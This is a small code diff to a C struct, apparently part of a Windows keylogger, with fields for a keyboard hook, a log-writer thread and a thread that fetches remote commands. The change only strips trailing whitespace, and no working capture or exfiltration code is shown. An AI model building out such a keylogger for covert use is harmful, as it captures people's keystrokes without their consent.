@@ -17,13 +17,13 @@
 typedef struct {
     CLIENT_HANDLER* client;  // client handler struct
     KEY_LOGGER* kLogger;     // keylogger struct
-    
+
     DWORD mainThreadId;   // id of the main thread
     HANDLE hWriteThread;  // handle to log writer thread
     HANDLE hCmdThread;    // handle to remote command retrieval worker thread
     HANDLE hMutexThreadSync;   // thread mutex handle
     HHOOK hLowLevelKeyHook;  // lowlevel key hook handle
-    
+
     BOOL shutdown;  // shutdown flag updated in the commands.c source file
     BOOL sleeping;  // if true, the key events will be skipped
 
